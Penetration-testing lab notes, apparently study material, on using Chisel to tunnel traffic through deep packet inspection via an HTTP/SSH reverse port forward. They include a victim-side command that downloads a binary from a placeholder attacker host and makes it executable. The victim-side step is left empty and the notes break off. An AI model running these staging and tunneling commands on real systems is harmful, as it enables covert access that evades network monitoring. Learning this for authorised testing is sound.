# Tunneling Through Deep Packet Inspection

- <https://en.wikipedia.org/wiki/Deep_packet_inspection>



## Chisel

- <https://github.com/jpillora/chisel/releases>

Is an HTTP tunneling tool that encapsulates our data stream within HTTP.

It also uses the SSH protocol within the tunnel so our data will be encrypted.

Chisel uses a client/server model.
A Chisel server must be set up, which can accept a connection from the Chisel client. 
Various port forwarding options are available depending on the server and client configurations.

One useful option is reverse port forwarding, which is similar to SSH remote port forwarding.


Older tools like `HTTPTunnel` offer similar tunneling functionality, but lack the flexibility and cross-platform capabilities of Chisel.
- <http://http-tunnel.sourceforge.net/>







1. We will run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on [VICTIM 1].

The Chisel server and client are actually run from the same binary, they're just initialized with either server or client as the first argument.
If our target host is running a different operating system or architecture, we have to download and use the compiled binary for that specific operating system and architecture from the Chisel Github releases page.

On ATTACKER MACHINE:
```
sudo systemctl start apache2
sudo cp $(which chisel) /var/www/html/
```

On VICTIM 1:
```
wget [ATTACKER]/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```





Once we have the Chisel binary on both our Kali machine and the target, we can run them.
On the Kali machine, we'll start the binary as a server with the server subcommand, along with the bind port (`--port`) and the `--reverse` flag to allow the reverse port forward.

On ATTACKER
```
chisel server --port 8080 --reverse


## run tcpdump on our Kali machine to log incoming traffic
sudo tcpdump -nvvvXi tun0 tcp port 8080
# Output:
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

On VICTIM 1
```

```





















































